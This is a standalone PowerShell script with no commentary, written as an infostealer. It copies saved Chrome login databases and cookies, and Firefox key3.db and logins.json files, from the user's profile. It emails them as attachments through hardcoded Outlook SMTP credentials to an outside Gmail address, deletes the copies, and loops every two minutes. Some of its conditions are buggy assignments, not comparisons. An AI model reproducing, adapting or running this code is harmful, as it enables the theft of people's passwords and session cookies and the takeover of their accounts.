do{
$username=$env:Username

$From = "novicehckr@outlook.com"
$Pass = "IMMrr1aN"
$To = "9844417@gmail.com"
$Subject = "Browser password"
$Body = $username
$SMTPServer = "smtp.outlook.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)


$path1=$path2=$path3=$path4=0
if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Login` Data)
{
	$chromeD="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
	$path1=1
	copy-item -path $chromeD -destination D:/
	Rename-Item D:\Login` Data Login Data
	$Attachment1 = "D:\Login Data"
	
}


if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Login` Data)
{
	$chrome1="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
	$path2=1
	copy-item -path $chrome1 -destination E:/
	Rename-Item E:\Login` Data ProfileLogin1
	$Attachment2 = "E:\ProfileLogin1"
}


if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Cookies)
{
	$chrome3="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
	$path3=1
	copy-item -path $chrome3 -destination D:/
	Rename-Item D:\Cookies Cookies
	$Attachment3 = "D:\Cookies"
}

if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Cookies)
{
	$chrome3="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Profile 1\Cookies"
	$path4=1
	copy-item -path $chrome3 -destination E:/
	Rename-Item E:\Cookies Cookies1
	$Attachment4 = "E:\Cookies1"
}



if($path1=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment1
Remove-Item D:\Login Data

}

if($path2=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment2
Remove-Item E:\ProfileLogin1

}

if($path3=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment3
Remove-Item D:\Cookies

}

if($path4=1)
{
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment4
Remove-Item E:\Cookies1

}
 


$MPath="C:\Users\"+$username+"\AppData\Local\Mozilla\Firefox\Profiles"
if(Test-Path $MPath)
{

$profile=get-childitem $Mpath | where {$_.extension -eq '.default'}
$kpath= $Mpath + "\" + $profile.name+"\key3.db"
$lpath= $Mpath + "\" + $profile.name+"\logins.json"
if (Test-Path $kpath)
{

Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $kpath

}
if (Test-Path $lpath)
{

Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $lpath

}
start-sleep -Seconds 120
}until($infinity)
